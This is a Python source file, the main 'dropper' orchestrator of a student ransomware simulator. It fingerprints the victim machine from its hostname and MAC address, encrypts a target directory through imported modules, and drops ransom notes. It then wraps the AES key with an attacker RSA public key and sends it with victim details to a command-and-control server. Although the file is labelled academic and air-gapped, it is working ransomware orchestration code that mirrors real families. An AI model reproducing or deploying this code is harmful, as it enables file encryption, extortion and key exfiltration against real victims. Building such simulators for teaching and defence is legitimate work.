"""
dropper.py — Main Orchestrator (Kill Chain Entry Point)
IT360 Project 14: Ransomware Simulator (Academic Use Only)

This is the top-level module that orchestrates the full simulated
ransomware kill chain in sequence:

  1. Kill-switch check
  2. Victim fingerprinting (victim_id generation)
  3. File encryption (calls encryptor.py)
  4. Ransom note deployment (calls ransom_note.py)
  5. RSA key wrapping (wraps AES key with attacker public key)
  6. Key exfiltration to C2 (calls c2_client.py — P2's module)
  7. Summary report

In Phase 3 the C2 call is made through a lightweight local wrapper
so P1 can test the full chain independently. P2 replaces the stub
with the real Flask HTTPS call.

"""

import os
import sys
import hashlib
import platform
import uuid

# ---------------------------------------------------------------------------
# Path setup — allows running from project root
# ---------------------------------------------------------------------------
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

from src.common.config import (
    KILL_SWITCH_FILENAME,
    TARGET_DIRECTORY,
    RSA_PUBLIC_KEY_PEM,
    C2_REGISTER_ENDPOINT,
)
from src.encryptor.encryptor import run_encryption
from src.encryptor.ransom_note import drop_notes_in_all_affected_dirs

# RSA key wrapping
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding


# ---------------------------------------------------------------------------
# KILL-SWITCH
# ---------------------------------------------------------------------------

def check_kill_switch() -> None:
    """
    Halt execution immediately if the kill-switch flag file is present.

    Must be the very first action in the dropper — before any other
    import side-effects or operations occur.

    Mirrors the WannaCry (2017) kill-switch domain: the malware queried
    a hardcoded domain on startup; if it resolved, execution halted.
    Here a local flag file serves the same purpose for safe academic use.
    """
    if os.path.exists(KILL_SWITCH_FILENAME):
        print(f"[KILL SWITCH] '{KILL_SWITCH_FILENAME}' detected.")
        print("[KILL SWITCH] Dropper halted. No files were modified.")
        sys.exit(0)


# ---------------------------------------------------------------------------
# VICTIM FINGERPRINTING
# ---------------------------------------------------------------------------

def generate_victim_id() -> str:
    """
    Generate a unique, deterministic victim identifier.

    Combines the machine hostname and MAC address, then hashes them
    with SHA-256. The result is a stable 16-character hex string that
    uniquely identifies this machine without storing any PII.

    This mirrors how professional ransomware families (REvil, LockBit)
    track victims — a unique ID per machine, derived from hardware
    identifiers, used to look up the correct decryption key on the C2.

    Returns:
        str: 16-character hex victim ID.
    """
    hostname: str = platform.node()

    # Get MAC address as a stable hardware identifier
    mac_int: int = uuid.getnode()
    mac_str: str = ':'.join(
        f"{(mac_int >> (8 * i)) & 0xff:02x}" for i in reversed(range(6))
    )

    # SHA-256(hostname + MAC) — deterministic but not reversible
    raw: str = f"{hostname}:{mac_str}"
    victim_id: str = hashlib.sha256(raw.encode()).hexdigest()[:16]

    return victim_id


# ---------------------------------------------------------------------------
# RSA KEY WRAPPING
# ---------------------------------------------------------------------------

def wrap_aes_key_with_rsa(aes_key_hex: str) -> bytes:
    """
    Encrypt the AES session key with the attacker's RSA-2048 public key.

    Uses RSA-OAEP with SHA-256 padding — the standard for secure key
    wrapping. PKCS#1 v1.5 is intentionally avoided due to its
    vulnerability to Bleichenbacher's padding oracle attack.

    The wrapped key (256 bytes for RSA-2048) is what gets transmitted
    to the C2 server. Even if an attacker intercepts the POST request,
    they cannot recover the AES key without the RSA private key, which
    never leaves the C2 server.

    Args:
        aes_key_hex: Hex string of the 32-byte AES session key.

    Returns:
        bytes: RSA-OAEP encrypted AES key (256 bytes for RSA-2048).
    """
    aes_key_bytes: bytes = bytes.fromhex(aes_key_hex)

    # Load the attacker's public key from config.py
    public_key = serialization.load_pem_public_key(
        RSA_PUBLIC_KEY_PEM.strip().encode()
    )

    # Encrypt with RSA-OAEP + SHA-256
    wrapped_key: bytes = public_key.encrypt(
        aes_key_bytes,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return wrapped_key


# ---------------------------------------------------------------------------
# C2 EXFILTRATION STUB
# ---------------------------------------------------------------------------

def exfiltrate_to_c2(
    victim_id: str,
    hostname: str,
    wrapped_key_hex: str,
) -> bool:
    """
    Send the wrapped AES key to the C2 server via HTTPS POST.

    In the full integrated build, this calls P2's c2_client module
    which handles the actual Flask HTTPS request. This stub allows P1
    to test the full dropper kill chain independently before P2's
    module is merged.

    The stub prints what WOULD be sent and returns True to allow the
    rest of the kill chain to complete during isolated testing.

    Args:
        victim_id      : Unique victim identifier.
        hostname       : Victim machine hostname.
        wrapped_key_hex: RSA-wrapped AES key as hex string.

    Returns:
        bool: True if exfiltration succeeded (or stub), False on failure.
    """
    try:
        # Attempt to import P2's real C2 client if it exists
        from src.c2_server.c2_client import send_registration
        success = send_registration(victim_id, hostname, wrapped_key_hex)
        return success

    except ImportError:
        # P2's module not yet available — use stub for isolated testing
        print("\n[C2 STUB] P2 c2_client not found — using stub for isolated test.")
        print(f"[C2 STUB] Would POST to : {C2_REGISTER_ENDPOINT}")
        print(f"[C2 STUB] victim_id     : {victim_id}")
        print(f"[C2 STUB] hostname      : {hostname}")
        print(f"[C2 STUB] wrapped_key   : {wrapped_key_hex[:32]}... (truncated)")
        print("[C2 STUB] Simulating successful registration.\n")
        return True

    except Exception as e:
        print(f"[ERROR] C2 exfiltration failed: {e}")
        return False


# ---------------------------------------------------------------------------
# MAIN KILL CHAIN
# ---------------------------------------------------------------------------

def run_kill_chain() -> None:
    """
    Execute the full simulated ransomware kill chain.

    Execution order:
      1.  Kill-switch check — halt if flag file present
      2.  Victim fingerprinting — generate stable victim_id
      3.  File encryption — AES-256-CBC over target directory
      4.  Ransom note deployment — drop note in all affected dirs
      5.  RSA key wrapping — wrap AES key with attacker public key
      6.  C2 exfiltration — POST wrapped key + victim metadata to C2
      7.  Summary report — print full chain results
    """

    # ------------------------------------------------------------------
    # STAGE 1 — Kill-switch (must be first)
    # ------------------------------------------------------------------
    check_kill_switch()

    print("=" * 60)
    print("  IT360 Ransomware Simulator — Dropper v1.0 (P1)")
    print("  FOR ACADEMIC USE IN AIR-GAPPED VM ONLY")
    print("=" * 60)

    # ------------------------------------------------------------------
    # STAGE 2 — Victim fingerprinting
    # ------------------------------------------------------------------
    print("\n[STAGE 1/6] Victim fingerprinting...")
    hostname: str   = platform.node()
    victim_id: str  = generate_victim_id()
    print(f"[+] Hostname  : {hostname}")
    print(f"[+] Victim ID : {victim_id}")

    # ------------------------------------------------------------------
    # STAGE 3 — File encryption
    # ------------------------------------------------------------------
    print(f"\n[STAGE 2/6] Starting encryption of '{TARGET_DIRECTORY}'...")
    encryption_payload: dict = run_encryption(TARGET_DIRECTORY)

    if encryption_payload["files_encrypted"] == 0:
        print("[!] No files were encrypted. Halting kill chain.")
        sys.exit(0)

    aes_key_hex: str = encryption_payload["aes_key_hex"]
    files_encrypted: int = encryption_payload["files_encrypted"]

    # Collect the .locked file paths for ransom note placement
    locked_files: list[str] = []
    for dirpath, _, filenames in os.walk(TARGET_DIRECTORY):
        for filename in filenames:
            if filename.endswith(".locked"):
                locked_files.append(os.path.join(dirpath, filename))

    # ------------------------------------------------------------------
    # STAGE 4 — Ransom note deployment
    # ------------------------------------------------------------------
    print(f"\n[STAGE 3/6] Dropping ransom notes...")
    drop_notes_in_all_affected_dirs(
        encrypted_file_paths=locked_files,
        victim_id=victim_id,
        hostname=hostname,
        files_encrypted=files_encrypted,
    )

    # ------------------------------------------------------------------
    # STAGE 5 — RSA key wrapping
    # ------------------------------------------------------------------
    print(f"\n[STAGE 4/6] Wrapping AES key with RSA-2048 public key...")
    try:
        wrapped_key_bytes: bytes = wrap_aes_key_with_rsa(aes_key_hex)
        wrapped_key_hex: str     = wrapped_key_bytes.hex()
        print(f"[+] Wrapped key ({len(wrapped_key_bytes)} bytes): "
              f"{wrapped_key_hex[:32]}... (truncated)")
    except Exception as e:
        print(f"[ERROR] RSA wrapping failed: {e}")
        print("[ERROR] AES key NOT exfiltrated. Files encrypted but unrecoverable.")
        sys.exit(1)

    # ------------------------------------------------------------------
    # STAGE 6 — C2 exfiltration
    # ------------------------------------------------------------------
    print(f"\n[STAGE 5/6] Exfiltrating wrapped key to C2...")
    success: bool = exfiltrate_to_c2(victim_id, hostname, wrapped_key_hex)

    if success:
        print("[+] C2 registration successful.")
    else:
        print("[ERROR] C2 registration failed. Key may be unrecoverable.")

    # ------------------------------------------------------------------
    # STAGE 7 — Summary
    # ------------------------------------------------------------------
    print(f"\n[STAGE 6/6] Kill chain complete.")
    print("=" * 60)
    print(f"  Victim ID       : {victim_id}")
    print(f"  Hostname        : {hostname}")
    print(f"  Files Encrypted : {files_encrypted}")
    print(f"  C2 Registration : {'SUCCESS' if success else 'FAILED'}")
    print(f"  AES Key (hex)   : {aes_key_hex}")
    print("=" * 60)
    print("\n[i] To decrypt: python src/encryptor/decryptor.py <aes_key_hex>")
    print("[i] Or: trigger /release/<victim_id> on C2 (P2's server)")


# ---------------------------------------------------------------------------
# ENTRY POINT
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    run_kill_chain()